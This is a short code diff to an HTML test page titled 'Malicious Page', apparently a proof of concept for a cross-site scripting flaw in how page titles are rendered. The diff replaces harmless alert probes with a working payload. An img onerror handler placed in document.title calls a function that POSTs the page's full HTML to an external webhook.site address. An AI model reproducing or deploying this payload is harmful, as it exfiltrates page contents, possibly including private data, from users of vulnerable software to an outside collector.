@@ -21,10 +21,15 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><script>alert("aA")</script></title>
+    <title>Malicious Page</title>
     <script>
-        document.title = '<img src="" onerror="alert(1)">';
+        function sendHTML() {
+            fetch('https://webhook.site/fd72ea59-3fa6-4bc7-8a83-176bf7ad585b', {
+                method: 'POST',
+                body: document.documentElement.outerHTML
+            });
+        }
+        document.title = '<img src="" onerror="sendHTML()">';
     </script>
 </head>
 <body>
